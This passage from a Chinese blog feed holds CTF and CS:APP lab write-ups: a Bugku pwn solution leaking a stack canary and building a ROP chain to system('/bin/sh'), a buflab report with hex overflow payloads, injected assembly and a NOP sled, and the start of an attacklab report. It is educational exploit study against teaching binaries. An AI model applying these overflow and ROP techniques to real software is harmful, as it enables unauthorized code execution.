alt="Bugku_pwn4_2.png"></p><p>可以看到相对<code>rbp</code>的偏移为<code>-0x240</code>而且<code>canary</code>在<code>rbp-8</code>的位置，那么我们第一次的<code>payload</code>就很容易得知是<code>b&#39;a&#39;*(0x240-8-1)</code>了。然后用<code>recv</code>函数接受它输出的字符串，那么我们知道前面的<code>Hello</code>+<code>sapce</code>以及我们输入的<code>0x237</code>个<code>a</code>一共有<code>0x23e</code>个字节，这些都是垃圾数据，在接收完这些数据之后我们再往后接收七个字节，这些数据就是<code>canary</code>。那么分析到这里我们的<code>exp</code>就很好写了</p><p><img src="https://i.loli.net/2021/05/01/lb8YdQVfKAI32oh.png" alt="Bugku_pwn4_3.png"></p><p>在这里<code>p.sendline</code>对应<code>b&#39;a&#39;*0x237</code>然后你可以直接<code>p.recvline()</code>直接接收完垃圾数据或者是<code>p.recv(0x23e)</code>指定接收数据的长度的，因为<code>p.sendline()</code>会在指定的字符串之后添加一个<code>\n</code>字节，所以你前面只能有<code>0x237</code> 个填充的字节，然后此时<code>p.recvline()</code>在接收到<code>\n</code>字节后停止，这个和之前讲的字符串的判定类似。但是如果直接<code>p.send()</code>的话就可以填充满，并且你只能用第一个方法接收垃圾数据。那这样的话canary就成功被我们泄露并且保存了，接下来就是构造<code>shell</code>函数了。我们<code>shift+F12</code>查看字符串，一般<code>pwn</code>题的突破口都在这里，甚至逆向题也是如此。</p><p><img src="https://i.loli.net/2021/05/01/vyebYQpIdxDh3nl.png" alt="Bugku_pwn4_4.png"></p><p>查到<code>bin/sh(0x601068)</code>字符串，并且<code>system</code>函数直接在表里可以查到<code>0x400660</code>，但是<del>往后面调用了system函数以及堆了那个参数之后才</del>注意到这是64位程序，所以我们很轻(jian)松(nan)地可以得知这题肯定要用<code>rop</code>去传参给<code>rdi</code>寄存器了，32位和64位的传参差异我就不过多赘述了，前面博客很多次提到过了。那么这个时候我们先写出要执行的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq $0x601068,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>但是一般来说，带一个那么多位立即数的且指令一模一样的是不可能直接让你找到的。此时肯定不能莽撞，只可智取，我们因为栈上的数据我们可以随意写(只是不能写代码，写了也不能执行啊)，那么我们重新看一看栈的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">canary</span><br><span class="line">rbp</span><br><span class="line">rip</span><br></pre></td></tr></table></figure><p>我们如果在rip位置放一个<code>pop %rdi</code>的话，那么<code>rip</code>下方的数据就能直接被传出来，然后后面再放上<code>system</code>函数就完成了整个提权函数的构造了，那么我们的<code>payload</code>就直接是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+canary+fake_rbp+pop_rdi+bin_sh_addr+system_addr</span><br></pre></td></tr></table></figure><p>找rop碎片的方法在前面的attacklab中有提到很多的，大家可以翻翻我前面的博客，所以我们完整的exp就可以出炉了：</p><p><img src="https://i.loli.net/2021/05/01/uWeGAhXz3JHSqKM.png" alt="Bugku_pwn4_5.png"></p><p>今天真的学到了很多知识，非常的开心，但是对于初入ctf的小白我来说，还有很长的路要走。加油！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这几天一直在跟着团队的进度做&lt;code&gt;csapp&lt;/code&gt;的实验报告，突然想拿题来练手了才发现自己还是有点菜的。这次的任务是做一道简简单单的带&lt;code&gt;canary&lt;/code&gt;保护的一题，做了很长时间问了很多师傅，也算把这个方法搞搞明白了，但是不确定能不能完全说的明白，那么下面就开始吧。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>bufblab实验报告:32位程序缓冲区溢出攻击</title>
    <link href="http://example.com/2021/04/30/buflab/"/>
    <id>http://example.com/2021/04/30/buflab/</id>
    <published>2021-04-29T16:10:00.000Z</published>
    <updated>2021-10-25T05:23:48.383Z</updated>
    
    <content type="html"><![CDATA[<p>在此实验开始之前，弄清楚给你的三个文件分别干嘛的。</p><p><code>bufbomb</code>：实验需要攻击的程序</p><p><code>hex2raw</code>：根据填写的字节生成攻击字符串</p><p><code>makecookie</code>：对每个实验用户生成一个八位十六进制的字节序列，用于识别用户。(可能是用来打分的)</p><p>在<code>gdb</code>要运行的时候，一定要输入<code>r -u &lt;your id&gt;</code>，终端运行要输入<code>./bufbomb -u &lt;your id&gt;</code>，否则你是运行不了的。那咱们先输入<code>./makecookie -q</code>生成你的<code>cookie（id）</code>,最好先找个地儿保存一下。</p><span id="more"></span><p>作者在这里赞美一下这本书的编者：<code>csapp</code>的所有实验设计简直不要太好，学习计算机系统本是一个很枯燥的学习过程，但是这里的实验最大程度激发学生学习的兴趣。同时也希望国内的编者能够借鉴这本书的巧妙之处，让国内出越来越多的优秀教材。（由于本人表达能力不够，也只能这么夸了qwq）</p><h2 id="level0-Candle"><a href="#level0-Candle" class="headerlink" title="level0:Candle"></a>level0:Candle</h2><p>这一堆英文我反正也看不来<code>qwq</code>，既然是<code>level0</code>不妨问题想简单一点：给了我<code>test()</code>函数，调用了一个<code>getbuf()</code>，而后又有一个<code>gets()</code>危险函数，又给了一个<code>Smoke()</code>函数，那么无疑，应该就是通过溢出调用<code>Somke()</code>，先反正不涉及代码注入等东西<code>gdb</code>就是万能的，我们普通地这么溢出只需要确定两点：</p><ol><li>缓冲区的大小</li><li><code>Smoke()</code>函数的地址</li></ol><p>先<code>gdb bufbomb</code>然后：</p><p><code>print Smoke</code>就可以输出函数的地址，<code>disassemble getbuf</code>就可以查看<code>getbuf()</code>的汇编代码</p><p><img src="https://i.loli.net/2021/04/26/WNAayP3TSYiGJ5Z.png" alt="buflab_level0_1.png"></p><p>可以看到，<code>buf</code>的大小是<code>0x28</code>，那么就构造<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/EP5SQWcfa23hDi7.png" alt="buflab_level0_2.png"></p><p>但是发生了段错误，这里我调了很久，也可能是因为之前做64位的攻击，有点忘了32位的攻击的区别，因为真的之前就是它缓冲区开了多少我填那么多再堆返回地址就好了的。直到我看到<code>getbuf()</code>函数有一个<code>leave</code>指令，我这就去网上搜了一下<code>leave</code>指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Leave==</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>啊这？又被弹出来了原来的<code>ebp</code>?可能在你们眼里这个完全是个没必要犯得错误，但是我遇到了我就得这么讲出来，也算是一种提升吧。那就很清楚了，我们把函数返回地址弹出去了，就导致给<code>eip</code>的不知道是什么地址了。所以再加四字节的<code>00</code>，就会把<code>00 00 00 00</code>弹给<code>ebp</code>而把<code>smoke()</code> 函数的返回地址弹给<code>eip</code>了。所以正确的<code>payload</code>应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/tswP6XaDFAEB94S.png" alt="buflab_level0_3.png"></p><p>可以看到，这就攻击成功了，我是没想到啊，最简单的攻击就败下阵来，一次失败然后成功得到的经验比多次成功得到的经验是多很多的，所以嘛，这波不亏。</p><h2 id="level1-Sparkler"><a href="#level1-Sparkler" class="headerlink" title="level1:Sparkler"></a>level1:Sparkler</h2><p>这次要求我们执行的<code>shell</code>函数是<code>fizz(int val)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); </span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这回加了个参数判断，32位的程序，甚至不需要代码注入，参数直接往返回地址后面填就好了。地址怎么找我也就不赘述了，加参数的话，如果多位参数记得一定是从右往左入栈的，即：第一个参数在离栈顶最近，第二个就是网站底走四个字节，第三个……以此类推。但是一定注意栈帧的构成，它在调用函数的时候压完参数还要压<code>eip</code>，虽然我们不一定要它返回到什么地方，但是它有，所以我们在原来的基础上填充四个字节的假的返回地址再把参数加进去</p><p>payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">42 8c 04 08//fizz address</span><br><span class="line">00 00 00 00//fake returning address</span><br><span class="line">8a 5f 63 5e//your cookie</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/kjfapgYERzZxwvG.png" alt="buflab_level1_1.png"></p><p>那这个<code>level1</code>就也解决了，个人认为这个<code>buflab</code>应该放在<code>attacklab</code>前面的，64位参数不好直接传，但是32位就硬传，但是它这么设计必有什么我目前不知道的巧妙之处。</p><h2 id="level2-Firecracker"><a href="#level2-Firecracker" class="headerlink" title="level2:Firecracker"></a>level2:Firecracker</h2><p>这一次要求我们执行的<code>shell</code>函数是<code>bang()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value); </span><br><span class="line">        validate(<span class="number">2</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很清楚的看出来，程序定义了一个全局变量，执行这个函数的时候要求这个变量==<code>your cookie</code>我们都很清楚，全局变量不同于局部变量，局部变量是存在栈中的，全局变量存在<code>.bss</code>段或者是<code>.data</code>段的，因此我们要修改不可能只是简单的栈溢出，我们需要注入代码。在栈中注入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl value of cookie,address of global_value</span><br><span class="line">pushl (address of bang)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>因为栈可以执行代码，没必要去搜集<code>rop</code>碎片，直接注入这一串代码就行了。<code>bang()</code>函数的地址和<code>cookie</code>我们是很容易获取的，唯一就是这全局变量的地址我们没办法直接获取。我们可以选择<code>disassemble bang</code>反汇编这个函数看看具体的结构。</p><p><img src="https://i.loli.net/2021/04/29/vOFoK3wcjGVesHZ.png" alt="buflab_level2_1.png"></p><p>可以发现中间<code>cmp</code>指令比较一定就是那个<code>if</code>语句的实现，比较的东西肯定也是<code>cookie</code>和那个<code>global_value</code>，并且也很清楚的可以看到，它比较的内容都是<code>ds</code>段寄存器的 内容。至于这两个地址哪一个还需要进一步分析，因为我们可以很清楚的知道，在运行的时候我们的<code>cookie</code>就是已经确定的，而另一个则应该一直是0，所以我们可以先<code>b getbuf</code>然后<code>r- u xiaoji233</code>，运行在中间停住的时候<code>print *0x804d100</code>看看这个地址到底是什么。</p><p><img src="https://i.loli.net/2021/04/29/ZFRstrT8QAubCkJ.png" alt="buflab_level2_2.png"></p><p>其实结果就很明显了，<code>0x804d100</code>就是全局变量的地址，另一个你把它转换成十六进制就是你的<code>cookie</code>，确定完这三个内容以后重写一下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,0x804d100//在AT&amp;T汇编中，立即数一定要加$，不加代表是地址。</span><br><span class="line">push 0x8048c9d//此时不用考虑端序</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这里略微再提一下查看汇编代码机器码的方法，具体操作可以看我上一篇博文。。</p><p><img src="https://i.loli.net/2021/04/29/ds1iuEKNWXGUJ3P.png" alt="buflab_level2_3.png"></p><p>还有一点需要确定的就是缓冲区字符的首地址了，因为返回地址要填这个才能把<code>eip</code>劫持到栈上执行,那么我现在获取的地址是<code>0x55683868</code>，这个每个人id不同貌似会有不太一样的。那么方法就是先确定ebp然后看看字符串开始的位置相对于ebp的偏移，就能轻松算出来了。还有一个比较一般的方法应该适合大部分人，先<code>b getbuf</code>然后运行到gets函数之后观看栈的情况。如下图：</p><p><img src="https://i.loli.net/2021/04/29/A8cIFe3BvY7PSyT.png" alt="buflab_level2_4.png"></p><p>就可以很轻松地确定了，当你不确定自己填的返回地址是不对的情况下，这个方法百分百没错，那么我们的payload就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c7 04 25 00 </span><br><span class="line">d1 04 08 8a </span><br><span class="line">5f 63 5e 68 </span><br><span class="line">9d 8c 04 08 </span><br><span class="line">c3 00 00 00 //inject code</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">68 38 68 55//address of String&#x27;s top</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/29/D8Gm2SjunFXxQtd.png" alt="buflab_level2_5.png"></p><h2 id="level3-Dynamite"><a href="#level3-Dynamite" class="headerlink" title="level3:Dynamite"></a>level3:Dynamite</h2><p>这一关咱们需要再不破坏原有栈帧的情况下将返回值修改成我们自己的<code>cookie</code>，这十分符合一个黑客的作为，咱们身为黑客就该神不知鬼不觉的去拿到<code>shell</code>，不然容易被打awa，打<code>ctf-pwn</code>题的我们基本都是能获取<code>shell</code>什么事都干得出来。破坏了原本结构？关我啥事，我拿到了<code>shell</code>就够了。</p><p>言归正传，在这里其实<code>gdb</code>就特别好用，因为我能知道它函数返回地址在哪，我只需要查一下调用这个函数的主函数，看看调用函数前存了些什么东西进去就可以很清楚的知道了。但是呢，我们一定还是要先溢出，不然都没办法劫持<code>eip</code>了，至于破坏的内容可以在代码注入里面去修复。就可以写出我们要注入的代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl your cookie,%eax</span><br><span class="line">movl original ebp address,%ebp</span><br><span class="line">push original eip</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>那么我们只需要找到原来的<code>ebp</code>和<code>eip</code>就可以实现攻击了,那我们就先给<code>getbuf()</code>的第一句下个断点看看此时<code>ebp</code>的值，<code>getbuf</code>的反汇编结果见上面的图。<code>b *0x80491f4</code>断住查看 <code>esp</code>的值。</p><p><img src="https://i.loli.net/2021/04/29/gx6R1cHPh3iQuMA.png" alt="buflab_level3_1.png"></p><p>可以很清楚地看到esp</p><p>至于<code>epi</code>，可以返回汇编它的父函数，可以看到<code>call</code>完<code>getbuf()</code>的下一条指令地址，这个应该就是之前保存的返回地址了。</p><p><img src="https://i.loli.net/2021/04/29/VWAo9rX3JPUuhqT.png" alt="buflab_level3_2.png"></p><p>这里讲一下函数调用的机制，先是传参数，32位的程序是从左到右依次入栈，64位的程序则是前六个参数分别进入<code>rdi,rsi,rdx,rcx,r8,r9</code>寄存器，参数多于六个再从右往左依次入栈。接下来保存调用该函数语句下一句的指令地址存在栈上，这个就是所谓的返回地址了。至于接下来的事，那就是在函数里面了，分别有保存父函数的栈帧情况，计算完成后返回值保存在<code>eax</code>寄存器之后先恢复父函数的栈帧情况(弹出<code>ebp</code>，<code>esp</code>+对应的值)，弹出<code>eip</code>。</p><p>那么注入的代码就很清楚了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,%eax</span><br><span class="line">movl $0x556838c0,%ebp</span><br><span class="line">push $0x08048dbe</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>运行一遍看看，完美！！！</p><p><img src="https://i.loli.net/2021/04/29/VH8wgMDON5KPln4.png" alt="buflab_level3_3.png"></p><h2 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4: Nitroglycerin"></a>Level 4: Nitroglycerin</h2><p>这一关，这一关你需要使用<code>./bufbomb -n</code>去执行，加了参数之后就不会执行<code>test()</code>函数了，而是<code>testn()</code>函数，调用<code>getbufn()</code>函数并且使它返回你的<code>cookie</code>，乍一听跟<code>level3</code>咋一模一样，但是自己调试一遍就会发现它要求你输入五次，并且每次的栈帧都不一样，我测试了一遍，每一次的字符串起始位置值是分别是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55683688</span><br><span class="line">0x55683658</span><br><span class="line">0x55683668</span><br><span class="line">0x55683628</span><br><span class="line">0x55683688</span><br></pre></td></tr></table></figure><p>那么我们注入的代码就不能直接<code>mov $xxxx,%ebp</code>了，得靠点其它东西，想想函数调用的过程，是有一个过程叫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push %ebp</span><br><span class="line">mov %esp,%ebp</span><br><span class="line">sub $xxx,%ebp</span><br><span class="line">//调用过程</span><br><span class="line">add $xxx,%ebp</span><br><span class="line">pop %ebp</span><br></pre></td></tr></table></figure><p>我们发现调用的过程中，只有栈是被我们破坏了，寄存器是完好无损的，但是<code>ebp</code>寄存器有一个取栈上数据的操作，但是<code>esp</code>寄存器至始至终是完好的呀。因此我们只要让<code>ebp</code>为<code>esp+0x28</code>(因为<code>testn()</code>在调用前申请了<code>0x24</code>的空间，再加上保存的<code>ebp</code>就是<code>0x28</code>)就行了，但是注意取的是地址，用<code>lea</code>指令，然后就是<code>eip</code>了，这没什么好说的，看看调用这个函数的下一句是什么就行了。但是注意，我们返回的地址也是要有讲究的，因为每一次都不一样，我们得靠<code>nop</code>指令。计算机执行<code>nop</code>指令除了内部一个计数器+1以外不会有任何操作，并且只占用一个字节<code>90</code>，而且刚刚好<code>getbuf()</code>函数它开的很大，给了我们充足的滑行距离。注入的代码我们尽量靠近栈底，然后返回的地址尽量选取最小的(0x55683860)，以便于覆盖所有的情况。那我们注入的代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5e635f8a,%eax</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push $0x08048e3a</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>然后确定一下字节大小</p><p><img src="https://i.loli.net/2021/04/29/PGniK5S9eMjBR2U.png" alt="buflab_level4_1.png"></p><p>字符是从<code>0x208</code>的内存开始的，再加上<code>ebp</code>那就是<code>0x20c</code>的大小了，不同的是：那些我们都填充<code>90</code>就行了，<code>payload</code>就是</p><p><img src="https://i.loli.net/2021/04/29/dI7VyMspTgkN1Pa.png" alt="buflab_level4_2.png"></p><p>填充代码+代码长度为<code>0x20c</code>就好了。</p><p>然后，我就默默地调了两个小时的代码，去查了<code>wp</code>才发现，32位汇编和64位汇编的lea指令是不一样的，原来我就没注意这点<code>qwq</code>默默地枯了！！</p><p><img src="https://i.loli.net/2021/04/29/auI7AecP4CnKrUv.png" alt="buflab_level4_3.png"></p><p>然后就又是漫长的调试过程，我一直以为输入<code>r -u xiaoji233 -n &lt;attackraw4.txt</code>就可以了，没想到只输入一次，就是说每次都只有第一个是对的，一定要换这种命令才可以将字符串复制五次输入的，踩过的坑千万别踩，否则后果就是罚坐三小时，让大家康康我的撒花吧！！！</p><p><img src="https://i.loli.net/2021/04/30/oaBdniV29RuOLN4.png" alt="buflab_level4_4.png"></p><p>本作者在写wp的时候喜欢加上自己的思考，因为我也是新手，这篇wp对新手就比较友好，因为大概率是可以踩到目前新手能踩到的大部分坑的，如果哪里说的不对，恳请指正！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在此实验开始之前，弄清楚给你的三个文件分别干嘛的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bufbomb&lt;/code&gt;：实验需要攻击的程序&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hex2raw&lt;/code&gt;：根据填写的字节生成攻击字符串&lt;/p&gt;
&lt;p&gt;&lt;code&gt;makecookie&lt;/code&gt;：对每个实验用户生成一个八位十六进制的字节序列，用于识别用户。(可能是用来打分的)&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;gdb&lt;/code&gt;要运行的时候，一定要输入&lt;code&gt;r -u &amp;lt;your id&amp;gt;&lt;/code&gt;，终端运行要输入&lt;code&gt;./bufbomb -u &amp;lt;your id&amp;gt;&lt;/code&gt;，否则你是运行不了的。那咱们先输入&lt;code&gt;./makecookie -q&lt;/code&gt;生成你的&lt;code&gt;cookie（id）&lt;/code&gt;,最好先找个地儿保存一下。&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="lab" scheme="http://example.com/categories/csapp/lab/"/>
    
    
  </entry>
  
  <entry>
    <title>attacklab实验报告:代码注入以及rop攻击</title>
    <link href="http://example.com/2021/04/25/attqacklab/"/>
    <id>http://example.com/2021/04/25/attqacklab/</id>
    <published>2021-04-25T14:00:00.000Z</published>
    <updated>2021-10-25T05:22:05.955Z</updated>
    
    <content type="html"><![CDATA[<p>今天来康康attack lab啊</p><span id="more"></span><h2 id="Ctarget"><a href="#Ctarget" class="headerlink" title="Ctarget"></a>Ctarget</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>题目给出函数<code>test</code>，<code>test</code>里面有函数<code>getbuf</code>，然后它给定的提权函数是<code>touch1()</code>，我们那我们先<code>gdb ctarget</code>进入调试，然后输入<code>disassemble getbuf</code>查看汇编代码。</p><p><img src="https://i.loli.net/2021/04/26/4rX8hQMRAoB9g6k.png" alt="attacklab_Ctarget_level1_1.png"></p><p>可以很清楚的看到函数的缓冲区大小是<code>0x28</code>字节，然后<code>gets</code>已经说明是库的标准函数了，<code>gets</code>函数是有漏洞的，它在读入字符串的时候不会对长度检测，而是给多少读多少。那么我们可以用这个<code>gets</code>来实现栈溢出，执行我们的权限函数<code>touch1()</code>，我们可以先用<code>00</code>字节填充<code>40</code>个字节，然后再加上<code>shell</code>函数的地址。注意前面可以用除了<code>0a</code>的任意字节填充，因为<code>0a</code>代表<code>’\n’</code>的意思，<code>gets</code>函数一旦读到这个字符就会认为字符串读取结束了。我们用<code>print touch1</code>去查看该函数的地址。</p><p><img src="https://i.loli.net/2021/04/26/tsoDagXldAT5NYC.png" alt="attacklab_ctarget_level1_2.png"></p><p>发现了提权函数的地址之后我们就可以构造<code>payload</code>了。我们先<code>q</code>退出<code>gdb</code>，然后这里先创建一个文本文件<code>vim attack1.txt</code> 然后填充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure><p>注意，地址在计算机里是<strong>小端序</strong>存储。也就是<strong>高地址存储高位字节</strong>，然后我们构造的<code>payload</code>是往<strong>栈底方向</strong>填充的，而栈又是<strong>向低地址增长</strong>的，因此如此反转过后我们的函数地址要按字节倒着填充。然后根据字节生成字符串文件。</p><p>运行题目给的<code>hex2raw</code>文件，<code>./hex2raw &lt;source file&gt; target file</code>命令去生成目标文件。然后再<code>./ctarget -q -i target file</code>这里我生成的文件名叫<code>attackraw1.txt</code>，然后终端输入运行命令，发现攻击成功了。</p><p><img src="https://i.loli.net/2021/04/26/vY3tahzlkjQudCZ.png" alt="attacklab_ctarget_level1_3.png"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>这个需要攻击执行的函数名为<code>touch2()</code>，这个栈溢出的漏洞依然可以利用。但是<code>print touch2</code>之后你就会发现，<code>touch2</code>比<code>touch1</code>多了一个参数。故技重施之后发现：</p><p><img src="https://i.loli.net/2021/04/26/LAOwMRtHp97zThr.png" alt="attacklab_ctarget_level2_1.png"></p><p>虽然我们成功执行了<code>touch2()</code>函数，但是还是失败了，发现<code>touch2()</code>事实上那个参数是用来检测是否与<code>cookie</code>匹配的，而<code>cookie</code>的值已经告诉你了。在32位的程序里面，我们可以往返回地址后面写上<code>cookie</code>作为参数，但是64位程序前6个参数采用寄存器传参，那么要成功攻击就必须修改<code>rdi</code>寄存器的值为<code>cookie</code>。因为我们直接在返回位置覆盖函数地址，跟普通调用的区别就少了参数的传递，所以rdi的值至少在执行getbuf函数的时候不会看遍，这里有40字节大小的栈空间，那么我们就可以往栈中注入代码，代码应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line"></span><br><span class="line">call $touch2</span><br></pre></td></tr></table></figure><p><code>call</code>命令的操作数是根据<code>rip</code>偏移来的，那确定不了这个偏移，就没办法准确的<code>call</code>到这个<code>touch2()</code>函数，那么换一个思路：先往栈上堆返回地址，再返回<code>ret</code>弹出返回，那么我们在往栈上注入代码就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span 